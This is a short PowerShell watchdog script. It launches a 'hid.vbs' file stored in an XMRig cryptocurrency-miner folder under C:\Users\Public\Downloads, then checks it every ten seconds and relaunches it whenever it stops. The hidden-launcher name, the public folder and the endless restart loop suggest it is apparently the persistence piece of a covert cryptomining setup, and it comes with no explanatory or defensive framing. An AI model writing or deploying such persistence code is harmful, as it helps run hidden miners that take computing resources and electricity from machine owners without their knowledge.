$hidVbsPath = "C:\Users\Public\Downloads\xmrig-6.22.2\hid.vbs"

function Start-HidVbs {
  $global:hidVbsProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$hidVbsPath`"" -PassThru  # Removed -NoNewWindow
  Write-Host "hid.vbs START"
}

Start-HidVbs # Start the process initially

while ($true) {
  if ($global:hidVbsProcess.HasExited) {
    Write-Warning "hid.vbs STOP. Reboot..."
    Start-HidVbs # Restart the process
  } else {
    Write-Host "hid.vbs running..."
  }

  Start-Sleep -Seconds 10
}
